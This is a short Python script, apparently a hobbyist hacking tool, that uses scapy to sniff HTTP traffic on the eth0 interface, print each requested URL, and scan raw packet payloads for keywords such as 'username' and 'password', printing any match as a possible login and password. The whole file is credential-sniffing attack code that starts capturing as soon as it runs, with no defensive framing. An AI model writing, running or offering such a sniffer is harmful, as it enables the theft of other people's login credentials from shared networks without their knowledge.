import scapy.all as scapy
from scapy.layers import http
from rich.console import Console

def snif(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

keywords = ["username", "user", "login", "password", "passwd", "pass"]

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].path


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        for keyword in keywords:
            if keyword in load:
                return load

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        URL = get_url(packet)
        print('[+] URL: ' + URL)

        login_info = get_login_info(packet)
        if login_info:
            console = Console()
            console.print("\n\n\n[+]Взможный login:password: " + login_info + "\n", style="blue on red")



snif('eth0')